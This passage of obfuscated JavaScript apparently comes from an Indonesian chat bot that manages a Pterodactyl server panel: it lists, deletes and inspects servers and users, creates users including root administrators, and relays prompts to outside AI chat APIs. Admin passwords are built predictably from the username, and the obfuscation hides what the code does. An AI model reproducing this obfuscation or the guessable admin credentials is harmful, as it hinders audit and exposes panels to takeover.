dedicated_ip':![],'port_range':[]}})}),_0x2c24b0=await _0x25bea4[_0x240d04(0x1314)]();if(_0x2c24b0[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x2dde)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x2c24b0[_0x240d04(0x247c)][0x0],null,0x2));let _0x25a92c=_0x2c24b0[_0x240d04(0x2e69)],_0x512dba=await _0x1ce978[_0x240d04(0x1fdb)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+'SER\x20+\x20SERV'+'ER*\x0aTYPE:\x20'+'user\x0aID:\x20'+_0x113b54['id']+_0x240d04(0xe01)+_0x113b54[_0x240d04(0x268b)]+'\x20'+_0x113b54[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978['kHiSU'](_0x25a92c[_0x240d04(0x25d5)][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x25a92c[_0x240d04(0x25d5)][_0x240d04(0x187b)])+_0x240d04(0x173)+(_0x25a92c['limits']['disk']===0x0?_0x1ce978[_0x240d04(0xc1a)]:_0x25a92c[_0x240d04(0x25d5)]['disk'])+'\x20MB\x0aCPU:\x20'+_0x25a92c['limits'][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x1ce978['EuxdG'](_0x476bfb,_0x1ce978[_0x240d04(0x273c)]);}}case _0x1ce978['aBXFg']:{if(_0x1ce978[_0x240d04(0x1ccc)](_0x1ce978[_0x240d04(0x215)],_0x1ce978[_0x240d04(0x147d)])){if(!_0x3cd341)return _0x1ce978[_0x240d04(0x2709)](_0x476bfb,_0x1ce978['CISDX']);let _0x17bd15=_0x483c03[0x0]?_0x483c03[0x0]:'1',_0xb9239d=await _0x1ce978[_0x240d04(0x2921)](fetch,_0x1ce978[_0x240d04(0x253)](_0x1ce978[_0x240d04(0xc96)](domain,'/api/appli'+_0x240d04(0xf1a)+'rs?page='),_0x17bd15),{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0xc1d)]('Bearer\x20',apikey)}}),_0x3c9783=await _0xb9239d[_0x240d04(0x1314)](),_0x16e5fb=_0x3c9783[_0x240d04(0x2bb6)],_0x1c4b94='Berikut\x20li'+_0x240d04(0xe77);for(let _0x296321 of _0x16e5fb){let _0xfb869e=_0x296321[_0x240d04(0x2e69)];_0x1c4b94+=_0x240d04(0x11a6)+_0xfb869e['id']+(_0x240d04(0x2a4c)+'\x20')+(_0x1ce978[_0x240d04(0xf3e)](_0xfb869e[_0x240d04(0x2e69)]?.['user']?.[_0x240d04(0x2593)+'it'],null)?_0x1ce978[_0x240d04(0x27be)]:_0x1ce978['gMsbW'])+'\x0a',_0x1c4b94+=_0xfb869e[_0x240d04(0x181b)]+'\x0a',_0x1c4b94+=_0xfb869e[_0x240d04(0x268b)]+'\x20'+_0xfb869e['last_name']+'\x0a\x0a';}_0x1c4b94+=_0x240d04(0x160b)+_0x3c9783[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge']+'/'+_0x3c9783[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x1f4e)+'s']+'\x0a',_0x1c4b94+=_0x240d04(0x15aa)+_0x240d04(0xf23)+_0x3c9783[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0xa48)],_0x1ce978[_0x240d04(0xb83)](_0x476bfb,_0x1c4b94),_0x1ce978[_0x240d04(0x8e4)](_0x3c9783[_0x240d04(0x2982)]['pagination'][_0x240d04(0x25f3)+'ge'],_0x3c9783[_0x240d04(0x2982)]['pagination'][_0x240d04(0x1f4e)+'s'])&&_0x1ce978['KQGsr'](_0x476bfb,_0x240d04(0x714)+_0x240d04(0x191f)+_0x1ec495+_0x240d04(0x10ca)+_0x1ce978[_0x240d04(0x1cc3)](_0x3c9783[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],0x1)+(_0x240d04(0xaab)+_0x240d04(0x1f6b)+'an\x20selanju'+_0x240d04(0x253b)));}else _0x3819a0[_0x100bc4][_0x240d04(0xa48)]++;}break;case'delsrv':{if(_0x1ce978[_0x240d04(0x1a20)](_0x240d04(0x2e6b),_0x1ce978[_0x240d04(0x78b)])){if(!_0x3cd341)return _0x1ce978[_0x240d04(0xa01)](_0x476bfb,_0x1ce978[_0x240d04(0x1ac9)]);let _0x4b6649=_0x483c03[0x0];if(!_0x4b6649)return _0x476bfb(_0x1ce978[_0x240d04(0x27c4)]);let _0x553f79=await _0x1ce978[_0x240d04(0xd25)](fetch,_0x1ce978[_0x240d04(0x7e4)](domain+_0x1ce978[_0x240d04(0x214d)],_0x4b6649),{'method':_0x1ce978[_0x240d04(0xd6d)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1880)](_0x1ce978[_0x240d04(0x2c45)],apikey)}}),_0x172f95=_0x553f79['ok']?{'errors':null}:await _0x553f79[_0x240d04(0x1314)]();if(_0x172f95[_0x240d04(0x247c)])return _0x476bfb(_0x1ce978['OBmjL']);_0x1ce978[_0x240d04(0x1866)](_0x476bfb,_0x1ce978['ddlCt']);}else return _0x1ce978['rCRmZ'](_0x198c6b,_0x240d04(0x20db)+'us\x20menungg'+'u\x20'+_0x1ce978[_0x240d04(0x6f0)](_0x52e664,0x3e8)['toFixed'](0x2)+(_0x240d04(0x8ae)+_0x240d04(0x1820)+'bang\x20lagi.'));}break;case _0x1ce978[_0x240d04(0x14ff)]:{if(!_0x3cd341)return _0x1ce978['rfvbf'](_0x476bfb,_0x240d04(0xc37)+'er');let _0x472c94=_0x483c03[0x0];if(!_0x472c94)return _0x1ce978[_0x240d04(0x2ac8)](_0x476bfb,_0x1ce978[_0x240d04(0x27c4)]);let _0x293453=await _0x1ce978[_0x240d04(0x11b7)](fetch,_0x1ce978[_0x240d04(0x28f3)](_0x1ce978[_0x240d04(0x1aea)](domain,_0x240d04(0x12bd)+_0x240d04(0xf1a)+_0x240d04(0x2440)),_0x472c94),{'method':_0x240d04(0x795),'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x13a5)](_0x1ce978['lCEEi'],apikey)}}),_0x51b9dd=_0x293453['ok']?{'errors':null}:await _0x293453[_0x240d04(0x1314)]();if(_0x51b9dd[_0x240d04(0x247c)])return _0x476bfb(_0x1ce978['NWLyD']);_0x1ce978[_0x240d04(0x1545)](_0x476bfb,_0x240d04(0x149a)+_0x240d04(0x90d)+_0x240d04(0xa75));}break;case _0x1ce978[_0x240d04(0x19f9)]:{if(_0x1ce978[_0x240d04(0x139b)](_0x1ce978['YKAHq'],_0x1ce978['YKAHq'])){if(!_0x3cd341)return _0x476bfb(_0x1ce978[_0x240d04(0x1ac9)]);let _0x38d4b6=_0x483c03[0x0]?_0x483c03[0x0]:'1',_0x2068b1=await fetch(_0x1ce978[_0x240d04(0x72f)](domain,_0x1ce978[_0x240d04(0x1e34)])+_0x38d4b6,{'method':_0x240d04(0x27a7),'headers':{'Accept':_0x240d04(0x2724)+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['rWLAh'](_0x240d04(0x13f5),apikey)}}),_0x5c4547=await _0x2068b1[_0x240d04(0x1314)](),_0x4b4154=_0x5c4547['data'],_0x4e4621=[],_0x53208e=_0x240d04(0xcf6)+_0x240d04(0xf68)+_0x240d04(0xdd2)+'\x0a';for(let _0x34ffd9 of _0x4b4154){let _0x36b144=_0x34ffd9[_0x240d04(0x2e69)],_0x2c4ac8=await _0x1ce978['XNIgl'](fetch,_0x1ce978[_0x240d04(0x22d1)](_0x1ce978['nizdp'](domain,_0x1ce978[_0x240d04(0x188c)]),_0x36b144['uuid'][_0x240d04(0x1c39)]`-`[0x0])+_0x1ce978[_0x240d04(0x1d3f)],{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x27c)](_0x1ce978[_0x240d04(0x2c45)],capikey)}}),_0x209cde=await _0x2c4ac8[_0x240d04(0x1314)](),_0x2a3c7e=_0x209cde[_0x240d04(0x2e69)]?_0x209cde[_0x240d04(0x2e69)]['current_st'+_0x240d04(0x9b2)]:_0x36b144[_0x240d04(0xa58)];_0x53208e+=_0x240d04(0x2330)+'\x20'+_0x36b144['id']+'\x0a',_0x53208e+=_0x240d04(0x2a82)+_0x240d04(0x1749)+_0x36b144[_0x240d04(0x8f0)]+'\x0a',_0x53208e+=_0x240d04(0x175d)+_0x2a3c7e+'\x0a\x0a';}_0x53208e+=_0x240d04(0x4ed)+_0x5c4547[_0x240d04(0x2982)][_0x240d04(0x4e6)]['current_pa'+'ge']+'/'+_0x5c4547['meta'][_0x240d04(0x4e6)][_0x240d04(0x1f4e)+'s']+'\x0a',_0x53208e+=_0x240d04(0x202c)+'er:\x20'+_0x5c4547['meta'][_0x240d04(0x4e6)][_0x240d04(0xa48)],_0x1ce978[_0x240d04(0x16ec)](_0x476bfb,_0x53208e),_0x1ce978[_0x240d04(0x10fb)](_0x5c4547['meta'][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],_0x5c4547[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x1f4e)+'s'])&&_0x1ce978['tqxsl'](_0x476bfb,_0x240d04(0x714)+_0x240d04(0x191f)+_0x1ec495+_0x240d04(0x17bc)+_0x1ce978[_0x240d04(0x201a)](_0x5c4547[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],0x1)+('\x20untuk\x20mel'+'ihat\x20halam'+_0x240d04(0x53f)+_0x240d04(0x253b)));}else{let _0x2d25e7=_0x72759e[_0x240d04(0x2e69)];_0x2d25e7[_0x240d04(0x1b55)]&&(_0x43f589+=_0x240d04(0x11a6)+_0x2d25e7['id']+('\x20-\x20Status:'+'\x20')+(_0x1ce978[_0x240d04(0x10bb)](_0x2d25e7[_0x240d04(0x2e69)]?.[_0x240d04(0x1d73)]?.[_0x240d04(0x2593)+'it'],null)?_0x240d04(0x15f):'Active')+'\x0a',_0x2d340e+=_0x2d25e7['username']+'\x0a',_0x5cb05d+=_0x2d25e7['first_name']+'\x20'+_0x2d25e7[_0x240d04(0x19fc)]+'\x0a\x0a');}}break;case _0x1ce978['yEqWm']:{if(!_0x3cd341)return _0x476bfb('Khusus\x20own'+'er');let _0x129a21=_0x483c03[0x0],_0x5b666a=_0x129a21,_0x2ccdb6=_0x129a21,_0xbb0f8b=_0x129a21;if(!_0x129a21)return _0x1ce978[_0x240d04(0x2517)](_0x476bfb,'*Format\x20sa'+'lah!*\x0aPeng'+_0x240d04(0x20f1)+_0x1ce978['FoQKg'](_0x1ec495,_0x3e6565)+'\x20username');if(!_0x2ccdb6)return _0x476bfb(_0x240d04(0x17e8)+_0x1ce978[_0x240d04(0x187e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1d1d)+_0x240d04(0x27ba)+_0x240d04(0x1776)+'\x0a')+_0x1ce978[_0x240d04(0x45f)](_0x1ec495,_0x3e6565)+('\x20example,@'+'user'));if(!_0xbb0f8b)return _0x1ce978[_0x240d04(0x80a)](_0x476bfb,_0x240d04(0x17e8)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1d1d)+_0x240d04(0x27ba)+_0x240d04(0x1776)+'\x0a')+_0x1ce978['KlBPg'](_0x1ec495,_0x3e6565)+(_0x240d04(0xfe0)+_0x240d04(0x1d73)));let _0x5b71a7=_0x2ccdb6+_0x1ce978['SyHnd'],_0x36c815=await _0x1ce978[_0x240d04(0x1941)](fetch,_0x1ce978[_0x240d04(0x21d)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':'applicatio'+'n/json','Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x23d0)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x1ce978[_0x240d04(0x1c80)](_0x2ccdb6,_0x1ce978[_0x240d04(0x1a71)]),'username':_0x2ccdb6,'first_name':_0x2ccdb6,'last_name':_0x240d04(0x1645),'language':'en','root_admin':!![],'password':_0x5b71a7[_0x240d04(0x2cb7)]()})}),_0x3fc8be=await _0x36c815['json']();if(_0x3fc8be['errors'])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0x3fc8be[_0x240d04(0x247c)][0x0],null,0x2));let _0x53469b=_0x3fc8be[_0x240d04(0x2e69)],_0x3186b6=_0x240d04(0x1c21)+'r\x0a\x0a📡ID:\x20'+_0x53469b['id']+_0x240d04(0xc00)+_0x53469b[_0x240d04(0x1fda)]+('\x0a👤USERNAME'+':\x20')+_0x53469b[_0x240d04(0x181b)]+_0x240d04(0xfba)+_0x53469b[_0x240d04(0xf0)]+_0x240d04(0x6ed)+_0x53469b[_0x240d04(0x268b)]+'\x20'+_0x53469b['last_name']+(_0x240d04(0x2868)+':\x20')+_0x53469b[_0x240d04(0x5ef)]+_0x240d04(0x495)+_0x53469b[_0x240d04(0x1b55)]+('\x0a☢️CREATED\x20'+_0x240d04(0xd32))+_0x53469b[_0x240d04(0x881)]+_0x240d04(0x1f0f)+linkpanel+'\x0a';_0x476bfb(_0x3186b6);}break;case _0x1ce978[_0x240d04(0x13b)]:{if(_0x1ce978[_0x240d04(0x1a3)](_0x240d04(0x237e),_0x1ce978[_0x240d04(0x25f1)]))_0x1ce978[_0x240d04(0x133c)](_0x581072,_0x14abcd,_0x1fb044[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x1861)]);else{if(!_0x3cd341)return _0x1ce978[_0x240d04(0x27e8)](_0x476bfb,_0x1ce978[_0x240d04(0x1ac9)]);let _0x270f72=_0x483c03[0x0],_0x3b4766=_0x270f72,_0x152e54=_0x270f72,_0x1404d7=_0x270f72;if(!_0x270f72)return _0x476bfb(_0x240d04(0x17e9)+'lah!*\x0aPeng'+_0x240d04(0x20f1)+_0x1ce978[_0x240d04(0xafd)](_0x1ec495,_0x3e6565)+_0x240d04(0x688));if(!_0x152e54)return _0x476bfb(_0x240d04(0x17e8)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1d1d)+_0x240d04(0x27ba)+'\x0a\x0aContoh\x20:'+'\x0a')+_0x1ce978[_0x240d04(0x2333)](_0x1ec495,_0x3e6565)+(_0x240d04(0xfe0)+_0x240d04(0x1d73)));if(!_0x1404d7)return _0x476bfb(_0x240d04(0x17e8)+(_0x1ec495+_0x3e6565)+('\x20Username,'+_0x240d04(0x27ba)+_0x240d04(0x1776)+'\x0a')+_0x1ce978['rxpGm'](_0x1ec495,_0x3e6565)+(_0x240d04(0xfe0)+_0x240d04(0x1d73)));let _0xaf5cc=_0x1ce978[_0x240d04(0x171f)](_0x152e54,'46093'),_0x357e1d=await fetch(_0x1ce978[_0x240d04(0x28a5)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':_0x1ce978['TMKIo'],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x240d04(0x13f5)+apikey},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x1ce978['wNFVq'](_0x152e54,_0x1ce978[_0x240d04(0x1a71)]),'username':_0x152e54,'first_name':_0x152e54,'last_name':_0x1ce978[_0x240d04(0xa2a)],'language':'en','password':_0xaf5cc[_0x240d04(0x2cb7)]()})}),_0x18e97d=await _0x357e1d[_0x240d04(0x1314)]();if(_0x18e97d[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x1b37)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x18e97d[_0x240d04(0x247c)][0x0],null,0x2));let _0xbd1276=_0x18e97d['attributes'],_0x320838=_0x240d04(0x1c21)+_0x240d04(0x19e4)+_0xbd1276['id']+_0x240d04(0xc00)+_0xbd1276['uuid']+('\x0a👤USERNAME'+':\x20')+_0xbd1276['username']+_0x240d04(0xfba)+_0xbd1276[_0x240d04(0xf0)]+_0x240d04(0x6ed)+_0xbd1276[_0x240d04(0x268b)]+'\x20'+_0xbd1276[_0x240d04(0x19fc)]+(_0x240d04(0x2868)+':\x20')+_0xbd1276[_0x240d04(0x5ef)]+'\x0a📊ADMIN:\x20'+_0xbd1276[_0x240d04(0x1b55)]+(_0x240d04(0xf89)+_0x240d04(0xd32))+_0xbd1276[_0x240d04(0x881)]+_0x240d04(0x1f0f)+linkpanel+'\x0a';_0x1ce978[_0x240d04(0xc87)](_0x476bfb,_0x320838);}}break;case _0x240d04(0x168):{if(_0x1ce978[_0x240d04(0x8c9)]!==_0x1ce978[_0x240d04(0xdfe)]){if(!_0x3cd341)return _0x1ce978[_0x240d04(0x2a26)](_0x476bfb,_0x1ce978[_0x240d04(0x1ac9)]);let _0x2e9dba=_0x483c03[0x0];if(!_0x2e9dba)return _0x476bfb(_0x1ce978[_0x240d04(0x27c4)]);let _0x4c38a0=await _0x1ce978[_0x240d04(0x1ea7)](fetch,_0x1ce978['vYWKI'](_0x1ce978[_0x240d04(0x1881)](domain,_0x1ce978[_0x240d04(0x214d)]),_0x2e9dba),{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':'applicatio'+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x57f)](_0x240d04(0x13f5),apikey)}}),_0x4ff02d=await _0x4c38a0[_0x240d04(0x1314)]();if(_0x4ff02d['errors'])return _0x1ce978[_0x240d04(0x2c36)](_0x476bfb,_0x1ce978[_0x240d04(0x295e)]);let _0xa3cd57=_0x4ff02d['attributes'],_0x5d4461=await _0x1ce978[_0x240d04(0x11b7)](fetch,_0x1ce978[_0x240d04(0x15c2)](_0x1ce978[_0x240d04(0x2988)](domain,_0x1ce978[_0x240d04(0x188c)]),_0xa3cd57[_0x240d04(0x1fda)][_0x240d04(0x1c39)]`-`[0x0])+_0x1ce978[_0x240d04(0x1d3f)],{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978['WvUrq'](_0x1ce978[_0x240d04(0x2c45)],capikey)}}),_0x2f641d=await _0x5d4461[_0x240d04(0x1314)](),_0x3634bc=_0x2f641d[_0x240d04(0x2e69)];_0x1ce978[_0x240d04(0xbd5)](_0x476bfb,'*'+_0xa3cd57[_0x240d04(0x8f0)][_0x240d04(0xdd3)+'e']()+(_0x240d04(0x6fd)+_0x240d04(0x1340)+_0x240d04(0x175d))+_0x3634bc[_0x240d04(0xc5e)+_0x240d04(0x9b2)]+'\x0a\x0aID:\x20'+_0xa3cd57['id']+_0x240d04(0xfca)+_0xa3cd57['uuid']+_0x240d04(0x247f)+_0xa3cd57[_0x240d04(0x8f0)]+_0x240d04(0x2080)+_0xa3cd57[_0x240d04(0x5fc)+'n']+_0x240d04(0x2bd8)+await _0x1ce978['RbZQJ'](format,_0x3634bc[_0x240d04(0x2dbc)][_0x240d04(0x7f9)+'es'])[_0x240d04(0x2cb7)]()+_0x240d04(0x29a0)+(_0x1ce978[_0x240d04(0x278)](_0xa3cd57['limits'][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x1ce978[_0x240d04(0x11a)](_0xa3cd57[_0x240d04(0x25d5)][_0x240d04(0x187b)],'Mb'))+_0x240d04(0x786)+await _0x1ce978['IHhMN'](format,_0x3634bc['resources']['disk_bytes'])[_0x240d04(0x2cb7)]()+_0x240d04(0x29a0)+(_0x1ce978[_0x240d04(0x29a8)](_0xa3cd57[_0x240d04(0x25d5)]['disk'],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x1ce978[_0x240d04(0x208b)](_0xa3cd57['limits']['disk'],'Mb'))+_0x240d04(0x143a)+_0x3634bc['resources'][_0x240d04(0x19f5)+'te']+'%\x20/\x20'+(_0x1ce978[_0x240d04(0x2a0)](_0xa3cd57[_0x240d04(0x25d5)][_0x240d04(0x1795)],0x0)?_0x1ce978['UTfCZ']:_0x1ce978[_0x240d04(0x2af8)](_0xa3cd57[_0x240d04(0x25d5)][_0x240d04(0x1795)],'%'))+_0x240d04(0x10a7)+_0xa3cd57[_0x240d04(0x881)]+_0x240d04(0x1c36));}else _0x3f9ce5[_0x1d28e5]&&_0x1ce978[_0x240d04(0x1a4d)](_0x4712ec['now']()-_0x5556ae[_0x279f13][_0x240d04(0x1e3f)],0x7530)&&(_0x1ce978[_0x240d04(0x1275)](_0x16512b,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x3b0dc7(_0x5d61d4)+'*'),delete _0x4740de[_0x544e45]);}break;case _0x1ce978[_0x240d04(0x253a)]:{if(_0x1ce978[_0x240d04(0x96a)]!==_0x1ce978['guJjO']){if(!_0x3cd341)return _0x476bfb(_0x1ce978[_0x240d04(0x1ac9)]);let _0x146154=_0x483c03[0x0],_0x265cd7=await _0x1ce978[_0x240d04(0x130c)](fetch,_0x1ce978[_0x240d04(0x17f9)](_0x1ce978[_0x240d04(0x1ead)](domain,_0x1ce978[_0x240d04(0x22a8)]),_0x146154),{'method':_0x1ce978['CNfsd'],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978['pGpNg'](_0x1ce978[_0x240d04(0x2c45)],apikey)}}),_0x22d8bf=await _0x265cd7[_0x240d04(0x1314)]();if(_0x22d8bf[_0x240d04(0x247c)])return _0x1ce978['xgjYE'](_0x476bfb,'*User\x20Tida'+_0x240d04(0x1a54));let _0x3abe41=_0x22d8bf['attributes'];_0x476bfb('*'+_0x3abe41[_0x240d04(0x181b)][_0x240d04(0xdd3)+'e']()+(_0x240d04(0x2c24)+'er*\x0a\x0a```ID'+':\x20')+_0x3abe41['id']+'\x0aUUID:\x20'+_0x3abe41[_0x240d04(0x1fda)]+('\x0aUsername:'+'\x20')+_0x3abe41[_0x240d04(0x181b)]+_0x240d04(0x1600)+_0x3abe41[_0x240d04(0xf0)]+_0x240d04(0x247f)+_0x3abe41[_0x240d04(0x268b)]+'\x20'+_0x3abe41[_0x240d04(0x19fc)]+(_0x240d04(0x1626)+'\x20')+_0x3abe41['language']+'\x0aAdmin:\x20'+_0x3abe41[_0x240d04(0x1b55)]+_0x240d04(0x10a7)+_0x3abe41[_0x240d04(0x881)]+_0x240d04(0x1c36));}else return _0x1ce978['jAxYz'](_0x44271b,_0x1ce978[_0x240d04(0x17c4)]);}break;case _0x1ce978['moSZk']:{if(!_0x3cd341)return _0x1ce978[_0x240d04(0x212a)](_0x476bfb,_0x1ce978['CISDX']);let _0x429ef1=_0x483c03[0x0]?_0x483c03[0x0]:'1',_0x57461b=await _0x1ce978['ujPps'](fetch,_0x1ce978[_0x240d04(0x1518)](_0x1ce978[_0x240d04(0xd1)](domain,'/api/appli'+'cation/use'+_0x240d04(0x2b22)),_0x429ef1),{'method':_0x240d04(0x27a7),'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x9b3)](_0x240d04(0x13f5),apikey)}}),_0x4c73d4=await _0x57461b[_0x240d04(0x1314)](),_0x8e26d4=_0x4c73d4['data'],_0x36f3d3=_0x1ce978[_0x240d04(0x1301)];for(let _0x5afbe4 of _0x8e26d4){let _0x40da36=_0x5afbe4['attributes'];_0x40da36[_0x240d04(0x1b55)]&&(_0x36f3d3+=_0x240d04(0x11a6)+_0x40da36['id']+(_0x240d04(0x2a4c)+'\x20')+(_0x1ce978[_0x240d04(0x1fa0)](_0x40da36[_0x240d04(0x2e69)]?.['user']?.[_0x240d04(0x2593)+'it'],null)?_0x1ce978[_0x240d04(0x27be)]:_0x1ce978[_0x240d04(0xc6)])+'\x0a',_0x36f3d3+=_0x40da36[_0x240d04(0x181b)]+'\x0a',_0x36f3d3+=_0x40da36['first_name']+'\x20'+_0x40da36['last_name']+'\x0a\x0a');}_0x36f3d3+=_0x240d04(0x160b)+_0x4c73d4[_0x240d04(0x2982)]['pagination'][_0x240d04(0x25f3)+'ge']+'/'+_0x4c73d4['meta'][_0x240d04(0x4e6)]['total_page'+'s']+'\x0a',_0x36f3d3+=_0x240d04(0x2449)+'n:\x20'+_0x4c73d4[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0xa48)],_0x1ce978['qGPow'](_0x476bfb,_0x36f3d3),_0x1ce978['shHKV'](_0x4c73d4[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],_0x4c73d4[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x1f4e)+'s'])&&_0x1ce978[_0x240d04(0x379)](_0x476bfb,'Gunakan\x20pe'+_0x240d04(0x191f)+_0x1ec495+_0x240d04(0x1abf)+_0x1ce978['ygRMK'](_0x4c73d4[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],0x1)+('\x20untuk\x20mel'+'ihat\x20halam'+_0x240d04(0x53f)+_0x240d04(0x253b)));}break;case _0x240d04(0x1d5d):{if(!_0x33cfb1)return _0x1ce978['GQAUr'](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+_0x240d04(0x796))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+'node\x20js`'));let _0x2b50cb=await _0x1ce978[_0x240d04(0xcce)](fetch,_0x240d04(0x25fb)+'i.siputzx.'+'my.id/api/'+_0x240d04(0xbbc)+_0x240d04(0xeee)+_0x240d04(0x7db)+_0x240d04(0x7b3)+'ent='+_0x33cfb1),_0x8cc27e=await _0x2b50cb[_0x240d04(0x1314)]();_0x1ce978[_0x240d04(0x2dde)](_0x476bfb,_0x8cc27e['data']);}break;case _0x1ce978[_0x240d04(0x553)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x15c2)](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+'node\x20js`'));let _0xabb89c=await _0x1ce978[_0x240d04(0x2751)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+'my.id/api/'+_0x240d04(0x1133)+'rmes?conte'+_0x240d04(0x17ab)+_0x33cfb1),_0x31450f=await _0xabb89c[_0x240d04(0x1314)]();_0x1ce978[_0x240d04(0x506)](_0x476bfb,_0x31450f['data']);}break;case _0x1ce978[_0x240d04(0x5f0)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x22e0)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x20c3)](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x291)](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+_0x240d04(0x2f9)));let _0x6ce907=await _0x1ce978[_0x240d04(0x21aa)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+_0x240d04(0x1cc7)+_0x240d04(0x10ec)+_0x33cfb1),_0x3c69d0=await _0x6ce907['json']();_0x1ce978[_0x240d04(0x27a8)](_0x476bfb,_0x3c69d0[_0x240d04(0x2bb6)]);}break;case _0x1ce978[_0x240d04(0x1ea1)]:{if(_0x1ce978[_0x240d04(0x2275)](_0x1ce978[_0x240d04(0x2783)],_0x1ce978[_0x240d04(0x2783)]))_0x553414[_0xa23c64]&&_0x1ce978[_0x240d04(0x20d0)](_0x4002af[_0x240d04(0x104e)](),_0x349b4c[_0x30003e][_0x240d04(0x1e3f)])>=0x7530&&(_0x59a00d(_0x240d04(0xb17)+_0x240d04(0x2a04)+'an:\x20*'+_0x1ce978['NOxbL'](_0x2136cf,_0x2f2f87)+'*'),delete _0x3b42ab[_0x57c4c4]);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xa11)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x22a)](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+'ontoh\x20peng'+_0x240d04(0x796))+_0x1ce978['umDqQ'](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+'node\x20js`'));let _0x4932a0=await _0x1ce978[_0x240d04(0x2d13)](fetch,'https://ap'+_0x240d04(0x2c77)+_0x240d04(0x219a)+_0x240d04(0xa42)+_0x240d04(0xc4a)+_0x240d04(0x10ec)+_0x33cfb1),_0x4790d3=await _0x4932a0[_0x240d04(0x1314)]();_0x1ce978['FVjKW'](_0x476bfb,_0x4790d3[_0x240d04(0x2bb6)]);}}break;case _0x240d04(0x16de):{if(!_0x33cfb1)return 